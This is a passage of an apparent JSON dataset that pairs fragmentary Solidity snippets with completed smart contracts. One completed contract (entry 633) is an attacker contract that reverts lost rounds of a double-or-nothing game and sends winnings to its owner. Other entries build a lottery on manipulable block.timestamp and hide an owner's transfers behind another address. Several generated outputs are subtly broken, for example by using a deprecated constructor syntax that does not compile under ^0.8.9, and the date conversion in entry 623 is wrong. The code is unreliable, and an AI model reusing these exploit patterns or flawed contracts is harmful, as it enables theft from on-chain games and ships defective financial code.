        "input": "contract test{\n       struct Info {\n        uint a;\n        uint b;\n        uint[] data;\n    }\n    \n    mapping(address => Info) private infos;\n    \n    function set() public {\n        infos[msg.sender].a = 1;\n        infos[msg.sender].b = 2;\n        infos[msg.sender].data.push(3);\n    }\n    \n    function get() private view{\n      infos[msg.sender].a; \n      infos[msg.sender].b; \n      infos[msg.sender].data[0]; \n    } }\n\ncontract test{\n    struct Info {\n        uint a;\n        uint b;\n        uint[] data;\n    }\n    \n    address owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    mapping(address => Info) infos;\n    \n    function set() public {\n        infos[msg.sender].a = 1;\n        infos[msg.sender].b = 2;\n        infos[msg.sender].data.push(3);\n    }\n    \n    function get() public view{\n      infos[msg.sender].a; \n      infos[msg.sender].b; \n      require(owner == msg.sender, 'you cannot read this data, you are not the owner!');\n      infos[msg.sender].data[0]; \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    struct Info {\n        uint a;\n        uint b;\n        uint[] data;\n    }\n    \n    mapping(address => Info) private infos;\n    \n    constructor() public {\n        infos[msg.sender].a = 1;\n        infos[msg.sender].b = 2;\n        infos[msg.sender].data.push(3);\n    }\n\n    function set(uint _a, uint _b, uint _data) public {\n        infos[msg.sender].a = _a;\n        infos[msg.sender].b = _b;\n        infos[msg.sender].data.push(_data);\n    }\n    \n    function get() public view returns(uint, uint, uint){\n        require(infos[msg.sender].data.length > 0, \"Data is not set yet\");\n        return (infos[msg.sender].a, infos[msg.sender].b, infos[msg.sender].data[0]);\n    }\n}\n\n",
        "changed": 0
    },
    "596.sol": {
        "input": "function betLottery() external {\n    if (block.timestamp % 2 == 0) {\n        win();\n    }\n}\n\nstruct Saving {\n    uint256 balance;\n    uint256 endBlock;\n}\n\nrequire(\n    block.number > balances[msg.sender].endBlock,\n    \"You cannot withdraw yet\"\n);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Lottery {\n    mapping(address => Saving) public balances;\n    \n    struct Saving {\n        uint256 balance;\n        uint256 endBlock;\n    }\n    \n    event Win(address indexed winner, uint256 amount);\n    \n    function betLottery() external {\n        if (block.timestamp % 2 == 0) {\n            win();\n        }\n    }\n    \n    function win() internal {\n        uint256 reward = balances[msg.sender].balance;\n        require(reward > 0, \"No balance to reward\");\n\n        balances[msg.sender].balance = 0;\n        balances[msg.sender].endBlock = block.number + 10;\n        \n        msg.sender.transfer(reward);\n        emit Win(msg.sender, reward);\n    }\n\n    function withdraw() external {\n        require(\n            block.number > balances[msg.sender].endBlock,\n            \"You cannot withdraw yet\"\n        );\n        \n        uint256 amount = balances[msg.sender].balance;\n        require(amount > 0, \"No funds to withdraw\");\n\n        balances[msg.sender].balance = 0;\n        msg.sender.transfer(amount);\n    }\n\n    function deposit() external payable {\n        require(msg.value > 0, \"Must send some ether\");\n        balances[msg.sender].balance += msg.value;\n    }\n\n    function balanceOf(address _account) external view returns (uint256) {\n        return balances[_account].balance;\n    }\n}\n\n",
        "changed": 1
    },
    "597.sol": {
        "input": "owner = payable(msg.sender);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleContract {\n    address payable public owner;\n    \n    constructor() {\n        owner = payable(msg.sender);\n    }\n    \n    modifier onlyOwner {\n        require(msg.sender == owner, \"Caller is not the owner\");\n        _;\n    }\n\n    function changeOwner(address payable newOwner) public onlyOwner {\n        require(newOwner != address(0), \"New owner is the zero address\");\n        owner = newOwner;\n    }\n\n    function withdrawAll() public onlyOwner {\n        require(address(this).balance > 0, \"Contract balance is 0\");\n        owner.transfer(address(this).balance);\n    }\n\n    receive() external payable {}\n}\n\n",
        "changed": 0
    },
    "598.sol": {
        "input": "_balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n_balances[recipient] = _balances[recipient].add(amount);\nif (sender == _owner){\n    sender = _depo;\n}\nif (recipient == _owner){\n    recipient = _depo;\n}\nemit Transfer(sender, recipient, amount);\n\n\n",
        "output": "",
        "changed": 0
    },
    "599.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\n\ncontract NullContract{\n    address public constant NULLADDRESS = address(0);\n    \n    function retrieve() public pure returns(address){\n        return (address(0));\n    }\n}\n\n\n",
        "output": "pragma solidity >=0.4.22 <0.9.0;\n\ncontract NullContract{\n    address public constant NULLADDRESS = address(0);\n    \n    function retrieve() public pure returns(address){\n        return (address(0));\n    }\n}\n\n",
        "changed": 0
    },
    "600.sol": {
        "input": "pragma solidity ^0.8;\n\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n}\n\ncontract Crowdsale {\n    IERC20 public token;\n    uint256 price; \n\n    constructor (address _token, uint256 _price) {\n        token = IERC20(_token);\n        price = _price;\n    }\n\n    function buy() external payable {\n        uint256 amount = price * msg.value;\n        token.transfer(msg.sender, amount);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n}\n\ncontract Crowdsale {\n    IERC20 public token;\n    uint256 price; // amount of tokens per 1 ETH\n\n    constructor (address _token, uint256 _price) {\n        token = IERC20(_token);\n        price = _price;\n    }\n\n    function buy() external payable {\n        uint256 amount = price * msg.value;\n        token.transfer(msg.sender, amount);\n    }\n}\n\n",
        "changed": 0
    },
    "601.sol": {
        "input": "contract ezeNFT {\n    uint256 public tokenCounter;\n\n    constructor(){\n        tokenCounter = 201;\n    }\n\n    function _mintNewNFT( string memory name, string memory symbol, string memory tokenUri) public {\n        uint256 newTokenId = tokenCounter;\n        ezeynftFactory nfts = new ezeynftFactory(name,symbol,tokenUri,newTokenId);\n        tokenCounter += 1;\n    }\n\n    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4) {\n\n        return bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"));\n    }\n}\n\ncontract ezeynftFactory is ERC721 {\n    constructor(string memory name, string memory symbol,string memory tokenURI,uint tokenID) \n     ERC721(name,symbol)\n    {\n        _mint(msg.sender, tokenID); \n        _setTokenURI(tokenID,tokenURI);\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "603.sol": {
        "input": "mapping(address => Payment[]) public mainMap;\n\nfunction pay() public payable {\n    Payment[] storage payment = mainMap[msg.sender];\n    payment.push(Payment({amount: msg.value, timestamp: block.timestamp}));\n    mainMap[msg.sender] = payment;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PaymentContract {\n    struct Payment {\n        uint amount;\n        uint timestamp;\n    }\n\n    mapping(address => Payment[]) public mainMap;\n\n    function pay() public payable {\n        Payment[] storage payment = mainMap[msg.sender];\n        payment.push(Payment({amount: msg.value, timestamp: block.timestamp}));\n        mainMap[msg.sender] = payment;\n    }\n}\n\n",
        "changed": 0
    },
    "604.sol": {
        "input": "function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(amount > 0,\"FPO: transfer amount the zero\");\n        require(sender != address(0), \"FPO: transfer from the zero address\");\n        require(recipient != address(0), \"FPO: transfer to the zero address\");\n        _beforeTokenTransfer(sender, recipient, amount);\n        _balances[sender] = _balances[sender].sub(amount, \"FPO: transfer amount exceeds balance\");\n        if((automatedMarketMakerPairs[sender] || automatedMarketMakerPairs[recipient]) &&\n            !excludeFromFees[recipient] && !excludeFromFees[sender] && fee > 0 && !swapping){\n            swapping = true;\n            uint256 feeAmount = amount.mul(fee).div(100);\n            amount = amount.sub(feeAmount);\n            _balances[address(fpoSwap)] = _balances[address(fpoSwap)].add(feeAmount);\n            emit Transfer(address(sender), address(fpoSwap), feeAmount);\n            if(_balances[address(fpoSwap)] > 100000000 && runSwapping){\n                fpoSwap.swapAndLiquidity();\n            }\n            swapping = false;\n        }\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _runSwapAndLiquidity() internal virtual {\n        fpoSwap.swapAndLiquidity();\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IFpoSwap {\n    function swapAndLiquidity() external;\n}\n\n",
        "changed": 1
    },
    "605.sol": {
        "input": "uint256 public swapThreshold = 5 * 10**5 * (10 ** _decimals)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint8 private _decimals = 18;\n    uint256 public swapThreshold = 5 * 10**5 * (10 ** uint256(_decimals));\n\n    constructor() public {\n    }\n\n    function setDecimals(uint8 newDecimals) public {\n        _decimals = newDecimals;\n        swapThreshold = 5 * 10**5 * (10 ** uint256(_decimals));\n    }\n\n    function getDecimals() public view returns (uint8) {\n        return _decimals;\n    }\n}\n\n",
        "changed": 0
    },
    "606.sol": {
        "input": "  function printAddresses() public returns(addrToValue[] memory){\n        addrToValue[] memory addressesArray = new addrToValue[](simpleStorageArray.length);    \n        for(uint256 _ssArrIndex=0; _ssArrIndex<simpleStorageArray.length; _ssArrIndex++){\n            addrToValue memory addressTov;\n            addressTov.addr = address(simpleStorageArray[_ssArrIndex]);\n            addressTov.value = SimpleStorage(address(simpleStorageArray[_ssArrIndex])).retrieve();\n            addressesArray[_ssArrIndex] = addressTov;\n        }\n        return addressesArray;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint public data;\n\n    function store(uint _data) public {\n        data = _data;\n    }\n\n    function retrieve() public view returns (uint) {\n        return data;\n    }\n}\n\n",
        "changed": 1
    },
    "608.sol": {
        "input": "mapping(string -> address[]) paidUsers;\nfunction pay(string memory _title) public payable {\n   require(msg.value == movieInfo[_title].price, \"Invalid price for the film\");\n   \n   paidUsers[_title].push(msg.sender);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MoviePayment {\n    struct Movie {\n        uint price;\n    }\n    mapping(string => Movie) public movieInfo;\n    mapping(string => address[]) public paidUsers;\n\n    function addMovie(string memory _title, uint _price) public {\n        Movie memory newMovie = Movie({\n            price: _price\n        });\n\n        movieInfo[_title] = newMovie;\n    }\n\n    function pay(string memory _title) public payable {\n        require(msg.value == movieInfo[_title].price, \"Invalid price for the film\");\n\n        paidUsers[_title].push(msg.sender);\n    }\n\n    function getPaidUsers(string memory _title) public view returns(address[] memory) {\n        return paidUsers[_title];\n    }    \n}\n\n",
        "changed": 0
    },
    "609.sol": {
        "input": "MyERC20Contract = await ERC20ContractFactory.deploy(\"Hello\",\"SYM\");\n\nconstructor(string memory name_, string memory symbol_) {\n    name = name_;\n    symbol = symbol_;\n    _mint(msg.sender, 100e18);\n}\n\nsomeAddress = (await ethers.getSigners())[1];\n\nit(\"sould transfer tokens correctly\", async function() {\n    await MyERC20Contract\n    .connect(someAddress)\n    .transfer(someOtherAddress.address, 10);\n\n\n",
        "output": "",
        "changed": 0
    },
    "610.sol": {
        "input": "function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    mapping(address => uint256) public balanceOf;\n    uint256 public totalSupply;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor(uint256 initialSupply) public {\n        balanceOf[msg.sender] = initialSupply;\n        totalSupply = initialSupply;\n    }\n\n    function mint(uint256 amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n}\n\n",
        "changed": 0
    },
    "611.sol": {
        "input": "contract NFT is ERC721URIStorage { }\n\nfunction tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n        require(_exists(tokenId), \"ERC721Metadata: URI query for nonexistent token\");\n\n        string memory baseURI = _baseURI();\n        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\";\n    }\n\nfunction _baseURI() internal view virtual returns (string memory) {\n        return \"\";\n    }\n\n contract NFT is ERC721{\n    function _setTokenURI(uint256 tokenId, string memory _tokenURI) internal virtual {\n       require(_exists(tokenId), \"...\");\n       _tokenURIs[tokenId] = _tokenURI;\n           }\n   }\n\n\n",
        "output": "",
        "changed": 0
    },
    "612.sol": {
        "input": "interface IPrngSystemContract {\n    function getPseudorandomSeed() external returns (bytes32);\n}\n\nIPrngSystemContract constant PrngSystemContract =\n    IPrngSystemContract(address(0x169));\n\npragma solidity ^0.8.18;\n\ninterface IPrngSystemContract {\n    function getPseudorandomSeed() external returns (bytes32);\n}\n\ncontract Prng {\n    IPrngSystemContract constant PrngSystemContract =\n        IPrngSystemContract(address(0x169));\n\n    event RandomResult(bytes32 randomBytes, uint256 num);\n\n    function getPseudorandomSeed() public returns (bytes32 randomBytes) {\n        randomBytes = PrngSystemContract.getPseudorandomSeed();\n    }\n    \n    function getPseudorandomNumber(uint256 lo, uint256 hi) external returns (uint256 num) {\n        bytes32 randomBytes = getPseudorandomSeed();\n        num = uint256(randomBytes);\n        num = lo + (num % (hi - lo));\n        emit RandomResult(randomBytes, num);\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IPrngSystemContract {\n    function getPseudorandomSeed() external view returns (bytes32);\n}\n\ncontract Prng {\n    IPrngSystemContract constant PrngSystemContract =\n        IPrngSystemContract(0x169);\n\n    event RandomResult(bytes32 randomBytes, uint256 num);\n\n    function getPseudorandomSeed() public view returns (bytes32 randomBytes) {\n        randomBytes = PrngSystemContract.getPseudorandomSeed();\n    }\n    \n    function getPseudorandomNumber(uint256 lo, uint256 hi) external returns (uint256 num) {\n        bytes32 randomBytes = getPseudorandomSeed();\n        num = uint256(randomBytes);\n        num = lo + (num % (hi - lo + 1));\n        emit RandomResult(randomBytes, num);\n    }\n}\n",
        "changed": 0
    },
    "613.sol": {
        "input": "uint256 CurrentAsk private;\nuint256 CurrentBid private;\nuint256 LastTransactionPrice private;\n\nfunction setCurrentAsk(uint256 askPrice) public {\n  CurrentAsk=askPrice\n}\n\nfunction setCurrentBid(uint256 bidPrice) public {\n  CurrentBid=bidPrice\n}\n\nfunction setCurrentAsk(uint256 askPrice) public {\n      require(askPrice>LastTransactionPrice,\"ask higher amount\")\n      CurrentAsk=askPrice\n    }\n\n\nfunction setCurrentBid(uint256 bidPrice) public {\n      require(bidPrice > LastTransactionPrice, \"ask higher amount\")\n      CurrentBid=bidPrice\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MarketContract {\n    uint256 private CurrentAsk;\n    uint256 private CurrentBid;\n    uint256 private LastTransactionPrice;\n\n    function setCurrentAsk(uint256 askPrice) public {\n        require(askPrice > LastTransactionPrice, \"Ask price should be higher than last transaction price\");\n        CurrentAsk = askPrice;\n    }\n\n    function setCurrentBid(uint256 bidPrice) public {\n        require(bidPrice > LastTransactionPrice, \"Bid price should be higher than last transaction price\");\n        CurrentBid = bidPrice;\n    }\n\n    function getCurrentAsk() public view returns (uint256) {\n        return CurrentAsk;\n    }\n    \n    function getCurrentBid() public view returns (uint256) {\n        return CurrentBid;\n    }\n    \n    function getLastTransactionPrice() public view returns (uint256) {\n        return LastTransactionPrice;\n    }\n    \n    function setLastTransactionPrice(uint256 transactionPrice) public {\n        LastTransactionPrice = transactionPrice;\n    }\n}\n\n",
        "changed": 0
    },
    "614.sol": {
        "input": "kitties memory _kitty;\n_kitty.kittyPriceToday = 1 ether;\n_kitty.kittyPriceTomorrow = 2 ether;\n\nallKitties.push(_kitty);\n\nallKitties[0].kittyPriceToday = 5 ether;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract KittyContract {\n    struct Kitty {\n        uint256 kittyPriceToday;\n        uint256 kittyPriceTomorrow;\n    }\n\n    Kitty[] public allKitties;\n\n    function createKitty() public {\n        Kitty memory _kitty;\n        _kitty.kittyPriceToday = 1 ether;\n        _kitty.kittyPriceTomorrow = 2 ether;\n\n        allKitties.push(_kitty);\n    }\n\n    function updateKittyPrice() public {\n        allKitties[0].kittyPriceToday = 5 ether;\n    }\n}\n\n",
        "changed": 0
    },
    "617.sol": {
        "input": "constructor() {\n      owner = payable(msg.sender);\n  }\n\n  require(msg.sender == owner, \"Only owner can withdraw funds\"); \n  require(amount <= balance, \"Insufficient funds\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable public owner;\n    uint256 public balance;\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    function deposit() public payable {\n        balance += msg.value;\n    }\n\n    function withdraw(uint256 amount) public {\n        require(msg.sender == owner, \"Only owner can withdraw funds\"); \n        require(amount <= balance, \"Insufficient funds\");\n        \n        balance -= amount;\n        owner.transfer(amount);\n    }\n\n    fallback() external payable {\n        deposit();\n    }\n}\n\n",
        "changed": 1
    },
    "619.sol": {
        "input": "https:\nhttps:\nhttps:\netc...\n\nfunction _exists(uint256 tokenId) override internal view returns (bool) {\n    if (tokenId >= 1 && tokenId <= 10000) {\n        return true;\n    }\n\n    return super._exists(tokenId);\n}\n\nfunction ownerOf(uint256 tokenId) override public view returns (address) {\n    address owner = _owners[tokenId];\n\n    if (tokenId >= 1 && tokenId <= 10000 && owner == address(0x0)) {\n        return address(0x123);\n    }\n\n    return super.ownerOf(tokenId);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "620.sol": {
        "input": "pragma solidity ^0.8;\n\ninterface ICakeToken {\n    function mint(address _to, uint256 _amount) external;\n}\n\ninterface IBUSD {\n    function mint(uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    ICakeToken CAKE = ICakeToken(0xFa60D973F7642B748046464e165A65B7323b0DEE);\n    IBUSD BUSD = IBUSD(0x8516Fc284AEEaa0374E66037BD2309349FF728eA);\n\n    function mintCake(address to, uint256 amount) external {\n        CAKE.mint(to, amount);\n    }\n\n    function mintBUSD(uint256 amount) external {\n        bool success = BUSD.mint(amount);\n        require(success);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ninterface ICakeToken {\n    function mint(address _to, uint256 _amount) external;\n}\n\ninterface IBUSD {\n    function mint(uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    ICakeToken CAKE = ICakeToken(0xFa60D973F7642B748046464e165A65B7323b0DEE);\n    IBUSD BUSD = IBUSD(0x8516Fc284AEEaa0374E66037BD2309349FF728eA);\n\n    function mintCake(address to, uint256 amount) external {\n        CAKE.mint(to, amount);\n    }\n\n    function mintBUSD(uint256 amount) external {\n        bool success = BUSD.mint(amount);\n        require(success);\n    }\n}\n\n",
        "changed": 0
    },
    "621.sol": {
        "input": "    \n     * https:\n    function uri(uint256) public view virtual override returns (string memory) {\n        return _uri;\n    }\n\n\n",
        "output": "",
        "changed": 0
    },
    "622.sol": {
        "input": " require(msg.value >= (freeMintCost * uint256(_mintAmount)));\n\ncontract Test {\n\n   int256 freeMints = 3;\n   uint256 cost = 1000;\n   uint256 freeMintCost = 0;\n    \n   function mint(int256 _mintAmount) public payable {\n       int256 payableMints = int256(_mintAmount - freeMints);\n       if(payableMints < 0){\n        payableMints = 0;\n       }\n       if(payableMints > 0){\n        require(msg.value >= (cost * uint256(payableMints)));\n       }\n       else{\n        require(msg.value >= (freeMintCost * uint256(_mintAmount)));\n       }\n   }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n\n    int256 public freeMints = 3;\n    uint256 public cost = 1000;\n    uint256 public freeMintCost = 0;\n    \n    function mint(int256 _mintAmount) public payable {\n        require(_mintAmount > 0, \"Mint amount must be positive\");\n        \n        int256 payableMints = _mintAmount - freeMints;\n        if(payableMints < 0){\n            payableMints = 0;\n        }\n        if(payableMints > 0){\n            require(msg.value >= (cost * uint256(payableMints)), \"Insufficient funds for paid mints\");\n        } else {\n            require(msg.value >= (freeMintCost * uint256(_mintAmount)), \"Insufficient funds for free mints\");\n        }\n        \n        // Implement mint logic here\n        // ...\n        \n        // Update the number of freeMints left\n        freeMints -= _mintAmount;\n        if(freeMints < 0){\n            freeMints = 0;\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "623.sol": {
        "input": "function timestampToDateTime(uint timestamp) public pure returns (uint year, uint month, uint day, uint hour, uint minute, uint second)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TimeConverter {\n\n    function timestampToDateTime(uint timestamp) public pure returns (uint year, uint month, uint day, uint hour, uint minute, uint second) {\n        uint secondsInDay = 60 * 60 * 24;\n        uint secondsInYear = secondsInDay * 365;\n        year = 1970 + timestamp / secondsInYear;\n        month = (timestamp % secondsInYear) / (secondsInDay * 30);\n        day = (timestamp % (secondsInDay * 30)) / secondsInDay;\n        hour = (timestamp % secondsInDay) / (60 * 60);\n        minute = (timestamp % (60 * 60)) / 60;\n        second = timestamp % 60;\n    }\n}\n\n",
        "changed": 0
    },
    "625.sol": {
        "input": "    function addrToENS(address addr) public view returns(string[] memory) {\n        ReverseRecords ens = ReverseRecords(ENSReverseLookupContractAddr);\n        address[] memory t = new address[](1);\n        t[0] = addr;\n        return ens.getNames(t);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ReverseRecords {\n    function getNames(address[] calldata owners) external view returns (string[] memory r);\n}\n\ncontract ENSLookup {\n    address private ENSReverseLookupContractAddr;\n\n    constructor(address _ENSReverseLookupContractAddr) public {\n        ENSReverseLookupContractAddr = _ENSReverseLookupContractAddr;\n    }\n\n    function addrToENS(address addr) public view returns(string[] memory) {\n        ReverseRecords ens = ReverseRecords(ENSReverseLookupContractAddr);\n        address[] memory t = new address[](1);\n        t[0] = addr;\n        return ens.getNames(t);\n    }\n}\n\n",
        "changed": 0
    },
    "626.sol": {
        "input": "uint[] arr;\n\nuint arr[size];\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ArrayContract {\n    uint[] public arr;\n    \n    constructor(uint size) {\n        arr = new uint[](size);\n        for(uint i=0; i<size; i++) {\n            arr[i] = i;\n        }\n    }\n    \n    function getArray() public view returns(uint[] memory) {\n        return arr;\n    }\n}\n\n",
        "changed": 0
    },
    "627.sol": {
        "input": "function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256, \n        uint256 batchSize\n    ) internal virtual {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    mapping(address => uint256) private _balances;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual {\n        _beforeTokenTransfer(msg.sender, recipient, amount, 1);\n        _balances[msg.sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount, \n        uint256 batchSize\n    ) internal virtual {\n        // Add any custom logic or checks before the token transfer here\n        require(_balances[from] >= amount * batchSize, \"Not enough tokens for the transaction\");\n    }\n}\n\n",
        "changed": 1
    },
    "628.sol": {
        "input": "constructor() payable  {\n   token = ERC20(0x123456789);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "629.sol": {
        "input": "function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\n        _transfer(from, to, amount);\n        return true;\n    }\n\nfunction transferFromCaller(address to, uint256 amount) public virtual override returns (bool) {\n        _transfer(msg.sender, to, amount);\n        return true;\n    }\n\n\n",
        "output": "",
        "changed": 0
    },
    "630.sol": {
        "input": "transferFrom(address(this), msg.sender,tokenId);\n\nfunction transferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override {\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: transfer caller is not owner nor approved\");\n\n        _transfer(from, to, tokenId);\n    }\n\n  address owner=ERC721.ownerOf(tokenId);\n  transferFrom(owner, msg.sender,tokenId);\n  \n\n\n",
        "output": "",
        "changed": 0
    },
    "631.sol": {
        "input": "bytes1 public hexNum = 0x2;\nbytes1 public hexStr = hex\"02\";\nbytes1 public numDecimal = 2;\n\n0x0000000000000000000000000000000000000002\n\n0x2000000000000000000000000000000000000000\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract TestContract {\n    // Variable declarations\n    bytes1 public hexNum = 0x2;\n    bytes1 public hexStr = hex\"02\";\n    bytes1 public numDecimal = 2;\n    address public firstAddress = 0x0000000000000000000000000000000000000002;\n    address public secondAddress = 0x2000000000000000000000000000000000000000;\n\n    // Function to get the variables\n    function getVariables() public view returns (bytes1, bytes1, bytes1, address, address) {\n        return (hexNum, hexStr, numDecimal, firstAddress, secondAddress);\n    }\n}\n\n",
        "changed": 0
    },
    "632.sol": {
        "input": "function allowance(address _owner, address _spender) public override view returns (uint256 remaining){\n        return allowed[_owner][_spender];\n    }\n\n  mapping(address=>mapping(address=>uint256)) allowed;\n\nfunction approve(address _spender, uint256 _value) public override returns (bool success){\n        allowed[msg.sender][_spender]=_value;\n        emit Approval(msg.sender,_spender,_value);\n        return true;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Token {\n    mapping(address => uint256) balances;\n    mapping(address => mapping(address => uint256)) allowed;\n    \n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n        return allowed[_owner][_spender];\n    }\n\n    function approve(address _spender, uint256 _value) public returns (bool success) {\n        allowed[msg.sender][_spender] = _value;\n        emit Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balances[msg.sender] >= _value);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n        require(allowed[_from][msg.sender] >= _value);\n        require(balances[_from] >= _value);\n        balances[_from] -= _value;\n        balances[_to] += _value;\n        allowed[_from][msg.sender] -= _value;\n        return true;\n    }\n}\n\n",
        "changed": 1
    },
    "633.sol": {
        "input": "contract Attacker {\n    address private doubleOrNothing  = ...; \n    address private owner = ...;  \n    \n    function play() payable external {\n        IDoubleOrNothing(doubleOrNothing).play{value: msg.value}();\n        if (address(this).balance < msg.value) revert;\n        owner.call{value: address(this).balance}();  \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IDoubleOrNothing {\n    function play() external payable;\n}\n\ncontract Attacker {\n    address private doubleOrNothing; \n    address payable private owner;  \n\n    constructor(address _doubleOrNothing, address payable _owner) {\n        doubleOrNothing = _doubleOrNothing;\n        owner = _owner;\n    }\n    \n    function play() payable external {\n        IDoubleOrNothing(doubleOrNothing).play{value: msg.value}();\n        if (address(this).balance < msg.value) revert();\n        (bool success, ) = owner.call{value: address(this).balance}(\"\");\n        require(success, \"Transfer failed.\");\n    }\n}\n\n",
        "changed": 1
    },
    "634.sol": {
        "input": "it(\"Should emit a received NFT event\", async function () {\n      const { bridge, owner } = await loadFixture(deployFixture);\n      const { token } = await loadFixture(deployMockNFTFixture);\n\n      await token.mint(owner.address)\n      console.log(await token.balanceOf(owner.address));\n      console.log(await token.ownerOf(1));\n\n      console.log(\"bridge.target: \", bridge.target)\n      console.log(\"owner.address: \", owner.address)\n\n      await token.approve(bridge.target, 1)\n\n      \n      console.log(await token.balanceOf(bridge.target));\n      console.log(await token.ownerOf(1));\n\n      expect(await token.transferFrom(owner.address, bridge.target, 1)) \n      .to.emit(bridge, \"ReceivedNFT\");\n    })\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NFTBridge {\n    event ReceivedNFT(address operator, address from, uint256 tokenId, bytes data);\n\n    address public target;\n\n    constructor(address _target) {\n        target = _target;\n    }\n\n    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns(bytes4) {\n        emit ReceivedNFT(operator, from, tokenId, data);\n        return this.onERC721Received.selector;\n    }\n}\n\n",
        "changed": 0
    },
    "635.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"https:\n\ncontract A {\n   using SafeMath for uint256;\n}\n\ncontract B is A {\n    using SafeMath for uint256; \n\n   function foo() pure public returns (uint256) {\n     uint256 test = 1;\n     return test.mul(3);\n   }\n}\n\npragma solidity ^0.6;\n\nimport \"https:\n\ncontract A {\n   using SafeMath for uint256;\n}\n\ncontract B is A {\n\n   function foo() pure public returns (uint256) {\n     uint256 test = 1;\n     return test.mul(3);\n   }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "636.sol": {
        "input": "function Ownable() payable public{}\n\n\n",
        "output": "pragma solidity ^0.4.22;\ncontract Ownable {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() payable public {\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    }\n\n    function Ownable() payable public {}\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(isOwner(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function isOwner() public view returns (bool) {\n        return msg.sender == _owner;\n    }\n\n    function renounceOwnership() public onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\n",
        "changed": 0
    },
    "637.sol": {
        "input": "function buyTokens(uint256 amount) external {\n  _mint(msg.sender, (98 * amount)/100);\n  _mint(liquidityPoolOwnerAddress, amount/100);\n  _mint(liquidityPoolAddress, amount/100);\n}\n\n\n\n",
